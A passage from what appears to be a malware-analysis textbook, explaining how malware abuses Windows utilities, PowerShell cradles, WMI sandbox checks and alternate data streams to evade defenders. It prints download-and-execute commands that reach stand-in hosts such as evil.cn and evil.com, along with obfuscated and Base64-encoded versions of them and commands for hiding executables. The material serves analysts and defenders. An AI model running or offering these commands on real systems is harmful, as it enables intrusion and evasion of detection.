<p class="TX">This command invokes certutil, downloads an executable file (<i>Zcldxvqciopgykje.exe</i>) from a web server (45.155.165.63), and executes it.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_300" aria-label="300"/>Malware can also use certutil to encode or decode a file, like so:</p>&#13;
<pre class="pre-139"><code>C:\&gt; certutil -encode evil.dll evil_encoded.dll</code></pre>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">-encode</samp> switch tells certutil to Base64-encode the file (we’ll talk about Base64 in <span class="Xref"><a href="chapter16.xhtml">Chapter 16</a></span>). Encoding a file this way can serve as a crude method to hide a file on disk or to obfuscate data before exfiltrating it from the network in order to bypass network defenses. Certutil is a great example of a multipurpose LOLBin.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
&#13;
<h5 class="H3" id="sec12"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Windows Script Host</samp></h5>&#13;
<p class="TNI1">Windows includes several built-in utilities as part of the <i>Windows Script Host (WSH)</i> for running scripting languages such as VBScript (<i>.vbs</i> and <i>.vbe</i> files) and JavaScript (<i>.js</i> and <i>.jse</i> files). Utilities such as <i>wscript.exe</i> and <i>cscript.exe</i> are part of the WSH. These utilities can be executed from the command line or spawned as a new process and used to run various types of script files. Scripting is much simpler than coding an executable in, for instance, C++, so some malware takes advantage of this. One example, a Microsoft Word document (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256: ccc8d5aa5d1a682c20b0806948bf06d1b5d11961887df70c8902d2146c6d1481</samp>) with embedded code, drops a JavaScript file to disk and executes the script using <i>wscript.exe</i> with this command:</p>&#13;
<pre class="pre-140"><code>C:\&gt; wscript.exe C:\Users\Public\olapappinuggerman.js</code></pre>&#13;
<p class="TX">Upon execution, this script downloads a sample from the malware family OriginLogger. This malicious document is part of a multistage attack that later invokes <i>mshta.exe</i> as well.</p>&#13;
<p class="TX">The <i>wscript.exe</i> binary can also be used to execute script files directly from NTFS Alternate Data Streams (ADS), which are covered later in this chapter. For now, just know that malware can hide files inside ADS, which effectively hides them from prying eyes and certain endpoint defenses. To execute a script file hidden in another file via an ADS, you’d use the following command:</p>&#13;
<pre class="pre-141"><code>C:\&gt; wscript.exe C:\innocent.txt:evil_script.vb</code></pre>&#13;
<p class="TX">Scripts are generally outside the scope of this book, but note that modern threats often use scripting languages like JavaScript and VBScript, which can be easily executed in Windows with the built-in Windows script interpreters.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
&#13;
<h4 class="H2" id="sec13"><span id="h-250"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Windows Command Line and Other Utilities</samp></h4>&#13;
<p class="TNI1">The built-in Command Prompt (<i>cmd.exe</i>), which is the default command line utility in Windows, is widely used both for legitimate and malicious purposes. For example, malware can use the command line for terminating processes, deleting files, making system configuration changes, and deleting backups. Some of the commands it uses also could be classified <span role="doc-pagebreak" epub:type="pagebreak" id="pg_301" aria-label="301"/>as LOLBin attacks, since <i>cmd.exe</i> is often used to execute other utilities. Malware often invokes Command Prompt by creating a new process (by calling <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateProcess</samp>, for instance) and passing in the command that it wishes to run as a parameter.</p>&#13;
<p class="TX">Perhaps the most common usage of Command Prompt is to directly execute other files and applications. This could look similar to the following code, which invokes an executable called <i>flashplayer.exe</i>:</p>&#13;
<pre class="pre-142"><code><var>--snip--</var>&#13;
lpCommandLine = "cmd.exe /c C:\Users\John\AppData\Local\Temp\flashplayer.exe"&#13;
&#13;
CreateProcessW (..., lpCommandLine, ... )&#13;
<var>--snip--</var></code></pre>&#13;
<p class="TX"><a href="chapter15.xhtml#tab15-2">Table 15-2</a> lists some other commands and utilities that are sometimes abused by malware to execute malicious actions. This list is by no means exhaustive, as there are many commands that can be invoked with <i>cmd.exe</i>.</p>&#13;
<p class="TT" id="tab15-2"><span class="Heavy"><samp class="SANS_Futura_Std_Heavy_B_11">Table 15-2:</samp></span> <samp class="SANS_Futura_Std_Book_11">Utilities and Commands Malware May Use</samp></p>&#13;
<table class="Basic-Table">&#13;
<thead>&#13;
<tr>&#13;
<th class="TCH" scope="col"><p class="TCH1"><samp class="SANS_Futura_Std_Heavy_B_11">Utility/command</samp></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><samp class="SANS_Futura_Std_Heavy_B_11">Example</samp></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><samp class="SANS_Futura_Std_Heavy_B_11">Description</samp></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td class="TBF"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">curl</samp></p></td>&#13;
<td class="TBF"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c curl -o output _file</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">https://evil.com/evil.gif</samp></p></td>&#13;
<td class="TBF"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">Transfers data. Malware may use it to download additional payloads and write them to a file, or to exfiltrate data to a remote web server.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">del</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c del C:\Users\</samp><samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">David</samp><samp class="SANS_TheSansMonoCd_W5Regular_11">\Temp\RegScvs.exe</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">Deletes files. Malware may use it to remove evidence, such as executables and temporary files, from the victim system.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">ipconfig.exe</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c ipconfig.exe</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">Displays network configuration settings. Malware</samp> <samp class="SANS_Futura_Std_Book_11">could invoke it to retrieve the victim’s local IP</samp> <samp class="SANS_Futura_Std_Book_11">address or other network information.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">ping</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c ping 8.8.8.8</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">Pings a remote server. Malware may use it to see whether the victim is connected to the internet (as a sandbox detection technique, for example) or to make an initial contact to its C2 server.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">sc</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c sc query</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">Starts, stops, creates, modifies, or queries services on the system when coupled with the respective option (such as</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">query</samp><samp class="SANS_Futura_Std_Book_11">, shown here).</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">taskkill.exe</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c taskkill.exe /f</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">/</samp><samp class="SANS_TheSansMonoCd_W5Regular_11">IM</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">evil.exe</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">Terminates processes. Malware may invoke it to kill either its own processes or analysis tools and endpoint defenses.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TBL"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">timeout.exe</samp></p></td>&#13;
<td class="TBL"><p class="TB1"><samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c timeout /t 120 nobreak&gt;nul</samp></p></td>&#13;
<td class="TBL"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">Pauses execution in batch scripts. Malware may execute it to attempt to time out “dumb” malware analysis sandboxes.</samp></p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="TX">While this section only scratches the surface of the Windows command line, these are some of the ways malware can abuse the operating system’s various utilities and commands in Windows. Since <i>cmd.exe</i> is a legitimate Windows binary, some of these actions may go unnoticed by endpoint defenses and analysts, so it’s important to be aware of these techniques.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec14">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_302" aria-label="302"/>&#13;
<h4 class="H2" id="sec14"><span id="h-251"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">PowerShell</samp></h4>&#13;
<p class="TNI1">Leveraging PowerShell is one of the most prevalent living off the land techniques in use by modern threats. <i>PowerShell</i> is a framework built into Windows that can be used, by legitimate system users and malware alike, to perform nearly any administration or configuration task in Windows. PowerShell exposes many commands, called <i>cmdlets</i>, that give the framework its power (pun intended). PowerShell is built on the .NET platform, which provides Windows developers with many libraries for building new applications. PowerShell can be run interactively via its command line, but in the context of malware, it’s often executed as an automated script or one-line command via the Windows API (using <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateProcess</samp>, for example).</p>&#13;
<section epub:type="division" aria-labelledby="sec15">&#13;
&#13;
<h5 class="H3" id="sec15"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Implementing Cradles</samp></h5>&#13;
<p class="TNI1">One of the most common applications of PowerShell in malware is a <i>cradle</i>, a command (usually a single line) that downloads additional malware or modules from a staging server, sometimes directly executing these files as well. Here’s one way in which malware might implement a cradle:</p>&#13;
<pre class="pre-143"><code>C:\&gt; powershell.exe Invoke-WebRequest "http://evil.cn/zzl2.cab" -OutFile&#13;
"$ENV:UserProfile\crypt.dll"</code></pre>&#13;
<p class="TX">Let’s break down this PowerShell command. First, it takes advantage of the <samp class="SANS_TheSansMonoCd_W5Regular_11">Invoke-WebRequest</samp> cmdlet, which sends an HTTP or HTTPS request to a remote web server. This cmdlet accepts as input the web server address and directory path of the file that will be downloaded (<i>zzl2.cab</i>). Finally, the <samp class="SANS_TheSansMonoCd_W5Regular_11">-OutFile</samp> flag denotes the directory path and filename with which to save the file. This malicious <i>zzl2.cab</i> file will be saved in the user’s profile directory (indicated by the environment variable <samp class="SANS_TheSansMonoCd_W5Regular_11">$ENV:UserProfile</samp>) as <i>crypt.dll</i>. Since PowerShell is built on .NET, it has direct access to and can take advantage of the many .NET methods and classes:</p>&#13;
<pre class="pre-144"><code>C:\&gt; powershell.exe -exec bypass -C "IEX(New-Object Net.WebClient)&#13;
.DownloadString('http://www.evil.cn/bad.ps1')"</code></pre>&#13;
<p class="TX">In this command, the <samp class="SANS_TheSansMonoCd_W5Regular_11">-exec</samp> flag tells PowerShell to bypass any execution policies in place that would prevent the command from executing. PowerShell execution policies are configured on Windows to prevent certain PowerShell actions but can sometimes be bypassed quite easily. <samp class="SANS_TheSansMonoCd_W5Regular_11">IEX</samp> is short for <samp class="SANS_TheSansMonoCd_W5Regular_11">Invoke-Expression</samp>, which will execute the string that precedes it as a command. The next part of the command, the <samp class="SANS_TheSansMonoCd_W5Regular_11">(New-Object Net.WebClient).DownloadString</samp> expression, creates a new .NET <samp class="SANS_TheSansMonoCd_W5Regular_11">WebClient</samp> object with the <samp class="SANS_TheSansMonoCd_W5Regular_11">DownloadString</samp> method, which is another way malware can send web requests to a remote web server and download a payload. This payload will be downloaded from <i>http://<wbr/>www<wbr/>.evil<wbr/>.cn</i> and executed directly in memory. If you’re interested in learning more about PowerShell cradles, see <a href="https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38"><i>https://<wbr/>gist<wbr/>.github<wbr/>.com<wbr/>/mgeeky<wbr/>/3b11169ab77a7de354f4111aa2f0df38</i></a> and <a href="https://gist.github.com/HarmJ0y/bb48307ffa663256e239"><i>https://<wbr/>gist<wbr/>.github<wbr/>.com<wbr/>/HarmJ0y<wbr/>/bb48307ffa663256e239</i></a>.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_303" aria-label="303"/>The problem with these PowerShell cradles is that they’re immediately identifiable as suspicious, so let’s look at how PowerShell commands can be obfuscated to circumvent endpoint defenses and inhibit investigation.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec16">&#13;
&#13;
<h5 class="H3" id="sec16"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Obfuscating PowerShell</samp></h5>&#13;
<p class="TNI1">PowerShell is extremely syntax tolerant, meaning that threat actors have a lot of room to obscure commands, rearrange characters in the command, or even insert unnecessary characters to confuse analysts and detection tools. As you’ll see, there are a few common ways in which malware authors obfuscate PowerShell execution. Let’s use this command as a starting point:</p>&#13;
<pre class="pre-145"><code>C:\&gt; powershell.exe -exec bypass -C "IEX(New-Object Net.WebClient)&#13;
.DownloadString('http://www.evil.cn/bad.ps1')"</code></pre>&#13;
<p class="TX">One simple obfuscation method is to insert <samp class="SANS_TheSansMonoCd_W5Regular_11">+</samp> characters into the command, as follows:</p>&#13;
<pre class="pre-146"><code>C:\&gt; powershell.exe -exec bypass -C "IEX(New-Object Net.WebClient)&#13;
.DownloadString('ht' + 'tp://'+'www.ev’+’il.cn/b’+’ad.ps1')"</code></pre>&#13;
<p class="TX">Characters can be either upper- or lowercase, so the following is still a valid PowerShell command:</p>&#13;
<pre class="pre-147"><code>C:\&gt; powershell.exe - EXeC bYpaSS -C "Iex(New-OBJect NeT.webclient)&#13;
.dOwNLOadStrINg('ht' + 'tp://'+'www.ev’+’il.cn/b’+’ad.ps1')"</code></pre>&#13;
<p class="BodyContinued">However, it’s a bit more difficult to read.</p>&#13;
<p class="TX">Characters can also be reordered, as in this example:</p>&#13;
<pre class="pre-148"><code>"{2}{1}{0}" -f 'X','E','I'</code></pre>&#13;
<p class="TX">The numbers in brackets represent the positions of the <samp class="SANS_TheSansMonoCd_W5Regular_11">X</samp>, <samp class="SANS_TheSansMonoCd_W5Regular_11">E</samp>, and <samp class="SANS_TheSansMonoCd_W5Regular_11">I</samp> characters after the reordering occurs, so these characters essentially make up <samp class="SANS_TheSansMonoCd_W5Regular_11">IEX</samp>.</p>&#13;
<p class="TX">Finally, PowerShell allows Base64-encoded data, so it’s entirely possible to issue an encoded command such as this:</p>&#13;
<pre class="pre-149"><code>C:\&gt; powershell.exe -EncodedCommand "cG93ZXJzaGVsbC5leGUg4oCTIGV4ZWMgYnlwYXNzIOKAk0Mg4oCcSUVYKE&#13;
5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmco4oCZaHR0cDovL3d3dy5ldmlsLmNuL2JhZC5wczHig&#13;
Jkp4oCd"</code></pre>&#13;
<p class="TX">We’ll discuss Base64 encoding in <span class="Xref"><a href="chapter16.xhtml">Chapter 16</a></span>. For now, we’ll turn to one final PowerShell-related functionality that malware can leverage to its advantage.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec17">&#13;
&#13;
<h5 class="H3" id="sec17"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Querying WMI</samp></h5>&#13;
<p class="TNI1">As you might recall from previous chapters, <i>Windows Management Instrumentation (WMI)</i> allows system administrators to manage data and automate operations in Windows. In Windows 7 and earlier versions, the <i>Windows</i> <span role="doc-pagebreak" epub:type="pagebreak" id="pg_304" aria-label="304"/><i>Management Instrumentation Console (WMIC)</i> was used to invoke WMI, but this is now deprecated on modern versions. It’s much more common now to invoke WMI using PowerShell, which has several built-in component cmdlets to interact with WMI. One example is <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-CimInstance</samp>, a cmdlet that malware can also use to query WMI objects. To gather information on the system, such as whether it’s a virtual machine or a sandbox, malware could execute the following commands directly from PowerShell:</p>&#13;
<pre class="pre-150"><code>PS C:\&gt; Get-CimInstance -Query "SELECT * FROM Win32_Processor"&#13;
PS C:\&gt; Get-CimInstance -Query "SELECT * FROM Win32_BIOS"&#13;
PS C:\&gt; Get-CimInstance -Query "SELECT * FROM Win32_DiskDrive"</code></pre>&#13;
<p class="TX">These commands query WMI for the system’s processor, BIOS, and disk drive information. In the following output, you can see from my BIOS information that I am running VirtualBox:</p>&#13;
<pre class="pre-151"><code>PS C:\&gt; Get-CimInstance -Query "SELECT * FROM_Win32_BIOS"&#13;
&#13;
<b>SMBIOSBIOSVersion : VirtualBox</b>&#13;
Manufacturer      : innotek GmbH&#13;
Name              : Default System BIOS&#13;
SerialNumber      : 0&#13;
<b>Version           : VBOX - 1</b>&#13;
<var>--snip--</var></code></pre>&#13;
<p class="TX">Other interesting objects to query are <samp class="SANS_TheSansMonoCd_W5Regular_11">ThermalZoneTemperature</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">Win32_Fan</samp>, which will return the current CPU temperature and the fan speed, respectively:</p>&#13;
<pre class="pre-152"><code>PS C:\&gt; Get-CimInstance -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature"&#13;
&#13;
PS C:\&gt; Get-CimInstance -Query "SELECT * FROM Win32_Fan"</code></pre>&#13;
<p class="BodyContinued">If these functions return an error or do not return any information, it could mean that they haven’t been implemented, meaning that the host is possibly a virtual machine.</p>&#13;
<p class="TX">WMI is an extensive topic, and there are other ways malware may invoke it (such as directly using WMI interfaces like <samp class="SANS_TheSansMonoCd_W5Regular_11">IwbemServices.ExecQuery</samp>), but these are beyond the scope of this book and won’t be discussed further. Instead, we’ll move on to one more living off the land and fileless technique: the use of dynamically compiled code.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec18">&#13;
&#13;
<h4 class="H2" id="sec18"><span id="h-252"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Dynamically Compiled Code</samp></h4>&#13;
<p class="TNI1"><i>Dynamically compiled malicious code</i> is seeing increased usage in malware. Upon delivery to the victim, this code is compiled and executed from memory, which may help the attack fly under the radar of endpoint defenses. This technique is often accompanied by the use of a dropper component. The dropper may be delivered to the victim (embedded inside an email, <span role="doc-pagebreak" epub:type="pagebreak" id="pg_305" aria-label="305"/>for example), and once it executes on the victim system, it downloads the malicious code from a server on the internet. This malicious code is often encrypted or obfuscated. Once the payload successfully downloads onto the victim host, it is decrypted and then compiled in memory by an existing compiler on the victim system. Modern versions of Windows include several compilers by default; these include the .NET compilers <i>msbuild.exe</i> and <i>csc.exe</i>. <a href="chapter15.xhtml#fig15-5">Figure 15-5</a> shows how this technique might look in action.</p>&#13;
<figure class="IMG"><img class="img100" id="fig15-5" src="../images/fig15-5.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-5: An attack involving dynamically compiled code</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">This attack starts with a PowerShell cradle that downloads uncompiled .NET code from a remote server, perhaps using one of the methods described earlier in this chapter. Then, the PowerShell script invokes <i>csc.exe</i> to compile and execute the .NET code in memory.</p>&#13;
<p class="TX">Another compiler is <i>msbuild.exe</i>. Microsoft Build Engine (<i>Msbuild</i>) is “a platform for building Windows applications” that accepts projects (<i>.proj</i>) or XML-based project files as input, compiles them, and executes them upon building. I won’t go into more detail on this technique, but you can read more about it in Tara Gould and Gage Mele’s article “Threat Actors Use MSBuild to Deliver RATs Filessly” at <a href="https://www.anomali.com/blog/threat-actors-use-msbuild-to-deliver-rats-filelessly"><i>https://<wbr/>www<wbr/>.anomali<wbr/>.com<wbr/>/blog<wbr/>/threat<wbr/>-actors<wbr/>-use<wbr/>-msbuild<wbr/>-to<wbr/>-deliver<wbr/>-rats<wbr/>-filelessly</i></a>.</p>&#13;
<p class="TX">These techniques are especially interesting because they take advantage of multiple methods of defense evasion. First, these types of attacks can be almost completely fileless, as the downloaded code is compiled and executed only in memory. Second, they use LOLBins and compilers already available on the victim host, possibly allowing the attack to bypass controls such as AppLocker. Finally, when the malicious code downloads from the attacker’s server, it does so in an uncompiled state, so network defenses may not identify the code as malicious since they’re often tuned to look for compiled binaries. These are more examples of the many creative ways in which malware authors bypass and circumvent defenses.</p>&#13;
<p class="TX">Note that there are other methods of dynamic code compilation in Windows, such as using CGG/MinGW C compilers or <i>aspnet_compiler.exe</i> for compiling ASP.NET code. These compilers may be invoked from PowerShell, Command Prompt, or even Office documents with the help of VBA macro code.</p>&#13;
<aside class="box" aria-label="box-12">&#13;
<p class="BoxTitle" id="box-12"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_306" aria-label="306"/><samp class="SANS_Dogma_OT_Bold_B_11">OTHER LOLBINS</samp></p>&#13;
<p class="BoxBodyFirst"><samp class="SANS_Futura_Std_Book_11">The utilities described throughout this section are by no means all there is to LOLBins. In fact, there’s an entire project dedicated to tracking and categorizing LOLBins called the LOLBAS project (</samp><a href="https://lolbas-project.github.io"><samp class="SANS_Futura_Std_Book_Oblique_I_11">https://lolbas-project.github.io</samp></a>), <samp class="SANS_Futura_Std_Book_11">which, at the time of this writing, is tracking nearly 200 LOLBins.</samp></p>&#13;
</aside>&#13;
<p class="TX">In the final section of this chapter, we’ll explore a category of evasion techniques, called anti-forensics, that often go hand in hand with fileless attacks.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec19">&#13;
&#13;
<h3 class="H1" id="sec19"><span id="h-253"/><samp class="SANS_Futura_Std_Bold_B_11">Anti-forensics</samp></h3>&#13;
<p class="TNI1">Imagine you’re an investigator recently assigned to a complex case of data theft. The victim organization determined that the incident occurred on a Windows server and was able to contain the attack by quarantining the server from the rest of the network, but not before the attacker made off with an unknown amount of potentially sensitive data. The strangest thing is that there are seemingly no breadcrumbs on the compromised server. No footprints to follow. No fingerprints or smudges left on the scene. All physical traces of malware have been removed from the hard disk. The system has been rebooted and there are no artifacts in memory to investigate. Some files on the disk even seem to have been encrypted, yet there is no demand for a ransom.</p>&#13;
<p class="TX">What you may be witnessing is anti-forensics in action. Let’s take a look at some creative anti-forensics techniques used by malware authors.</p>&#13;
<section epub:type="division" aria-labelledby="sec20">&#13;
&#13;
<h4 class="H2" id="sec20"><span id="h-254"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Hiding Artifacts and Code</samp></h4>&#13;
<p class="TNI1">Cyberattacks always leave some trace evidence on compromised systems or networks, no matter how skilled and creative the attacker is. Knowing this, evasive malware may go to great lengths to cover its tracks and remove as much forensic evidence as possible. This often involves hiding or removing artifacts that may give away the attack from infected systems.</p>&#13;
<p class="TX">One crude way in which malware can obscure evidence is by hiding important files and directories, such as its executable or configuration files. To do so, first the malware calls a function such as <samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileAttributes</samp> on the relevant files, and then it applies the <samp class="SANS_TheSansMonoCd_W5Regular_11">hidden</samp> attribute to them using the native Windows feature. This will effectively make the files invisible to some system users, but more experienced users and investigators will be able to easily circumvent this method.</p>&#13;
<section epub:type="division" aria-labelledby="sec21">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_307" aria-label="307"/>&#13;
<h5 class="H3" id="sec21"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Removing and Corrupting Artifacts</samp></h5>&#13;
<p class="TNI1">Rather than simply hiding files, some malware attempts to delete or destroy evidence altogether. It can delete its own files in many ways, such as by calling the <samp class="SANS_TheSansMonoCd_W5Regular_11">DeleteFile</samp> WinAPI function or invoking PowerShell or the Windows command line. Depending on the method of deletion, however, a skilled investigator might still be able to recover the deleted artifacts. To address this gap, some malware has incorporated utilities specializing in secure, unrecoverable data destruction. Unit42 researchers reported that the threat actors behind the BlackCat ransomware used fileshredder, a tool designed for unrecoverable destruction of files, to securely delete evidence from the victim system (see “Threat Assessment: BlackCat Ransomware,” by Amanda Tanner, Alex Hinchliffe, and Doel Santos, at <a href="https://unit42.paloaltonetworks.com/blackcat-ransomware/"><i>https://<wbr/>unit42<wbr/>.paloaltonetworks<wbr/>.com<wbr/>/blackcat<wbr/>-ransomware<wbr/>/</i></a>).</p>&#13;
<p class="TX">Additionally, since memory is one of the first places a skilled investigator hunts for malware, it’s wise for malware authors to clear their malware’s allotted memory. There are many ways of accomplishing this, such as by invoking the <samp class="SANS_TheSansMonoCd_W5Regular_11">RtlZeroMemory</samp> function, which overwrites a memory region with zeros, effectively destroying any evidence that was there. Some ransomware malware families have even been known to call <samp class="SANS_TheSansMonoCd_W5Regular_11">RtlZeroMemory</samp> and similar functions to zero out their encryption keys in memory to decrease the chances of key recovery.</p>&#13;
<p class="TX">Instead of completely erasing memory, an attacker could alter it to remove or change code or data that would give away the malware’s presence. For example, the malware could simply remove the PE magic bytes <samp class="SANS_TheSansMonoCd_W5Regular_11">MZ</samp> from a memory region, causing some investigation tools that rely on this signature to fail. Or it could hide parts of its code or configuration in memory, such as by encoding or encrypting strings like command and control addresses. We’ll discuss code and data obfuscation and encryption in <span class="Xref"><a href="chapter16.xhtml">Chapter 16</a></span>, but many of the techniques that apply there could also be used as anti-forensics measures.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec22">&#13;
&#13;
<h5 class="H3" id="sec22"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Abusing Alternate Data Streams</samp></h5>&#13;
<p class="TNI1">Another approach to hiding files is using NTFS Alternate Data Streams (ADS). Data contained in files in the Microsoft NTFS filesystem is usually located in a <i>primary data stream</i>. If you open a text file in a text editor, for example, the data displayed is part of the primary data stream. But data can also be hidden inside an ADS, in which case it won’t be readily apparent when an investigator inspects a file.</p>&#13;
<p class="TX">The best way to illustrate NTFS ADS is with an example. You can try this out yourself. First, create a text file with some dummy text and save the file as <i>file.txt</i>. To hide data in this file, run the following command:</p>&#13;
<pre class="pre-153"><code>C:\&gt;<b> echo hidden text &gt; file.txt:supersecret</b></code></pre>&#13;
<p class="TX">This command saves the text <samp class="SANS_TheSansMonoCd_W5Regular_11">hidden text</samp> in the NTFS ADS <samp class="SANS_TheSansMonoCd_W5Regular_11">supersecret</samp>. After running this command, if you open <i>file.txt</i> in a text editor, you won’t <span role="doc-pagebreak" epub:type="pagebreak" id="pg_308" aria-label="308"/>see the hidden text. To prove that the hidden text still exists, run the following command to print the primary data contained in the text file:</p>&#13;
<pre class="pre-154"><code>C:\&gt;<b> more &lt; file.txt</b></code></pre>&#13;
<p class="TX">Then, print out the text in the <samp class="SANS_TheSansMonoCd_W5Regular_11">supersecret</samp> ADS like so:</p>&#13;
<pre class="pre-155"><code>C:\&gt;<b> more &lt; file.txt:supersecret</b></code></pre>&#13;
<p class="TX">The output for the second command should be the data contained in the ADS. More practically, malware can hide code or a file, such as an executable, inside an ADS in a similar fashion. For example, the following command writes the malicious executable <i>evil.exe</i> to the file <i>invoice.doc</i> inside the data stream <samp class="SANS_TheSansMonoCd_W5Regular_11">evil</samp>:</p>&#13;
<pre class="pre-156"><code>C:\&gt;<b> more evil.exe &gt; invoice.doc:evil</b></code></pre>&#13;
<p class="TX">Using this command, I wrote an executable file of about 760KB to the file <i>invoice.doc</i>, as shown in <a href="chapter15.xhtml#fig15-6">Figure 15-6</a>.</p>&#13;
<figure class="IMG"><img class="img80" id="fig15-6" src="../images/fig15-6.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-6: Hiding an executable file in an ADS</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Viewing the document file’s metadata reveals that the file size is 12KB (the primary data stream) but with a “size on disk” value of 776KB (the total size of the file after I copied the executable file into its ADS).</p>&#13;
<p class="TX">Viewing this file in a hex editor or PE viewer reveals no anomalies. Data stored in the <samp class="SANS_TheSansMonoCd_W5Regular_11">evil</samp> data stream will be invisible to most file editors and investigation tools unless an investigator knows exactly what to look for. Streams (from the sysinternals suite) is a good tool for identifying ADS anomalies.</p>&#13;
<p class="TX">Using an NTFS ADS is only one mechanism for hiding malicious files and code from investigation. Another tactic is hiding code in the CLFS <span role="doc-pagebreak" epub:type="pagebreak" id="pg_309" aria-label="309"/>log subsystem, as shown by researchers at Mandiant (see the article “Too Log; Didn’t Read—Unknown Actor Using CLFS Log Files for Stealth” by Adrien Bataille and Blaine Stancill, at <a href="https://www.mandiant.com/resources/blog/unknown-actor-using-clfs-log-files-for-stealth"><i>https://<wbr/>www<wbr/>.mandiant<wbr/>.com<wbr/>/resources<wbr/>/blog<wbr/>/unknown<wbr/>-actor<wbr/>-using<wbr/>-clfs<wbr/>-log<wbr/>-files<wbr/>-for<wbr/>-stealth</i></a>). These techniques can effectively hide evidence from scrutinizing users and can add time and effort to the incident response and forensics investigation processes, both of which are boons to malware authors.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec23">&#13;
&#13;
<h5 class="H3" id="sec23"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Hiding Data with Steganography</samp></h5>&#13;
<p class="TNI1"><i>Steganography</i> is a technique for hiding data in ordinary file formats, such as image, video, and audio files. Modern evasive malware might use steganography to circumvent endpoint and network defenses, as it effectively hides or obfuscates malicious code within seemingly innocent files, but this technique also fits quite nicely into the category of anti-forensics.</p>&#13;
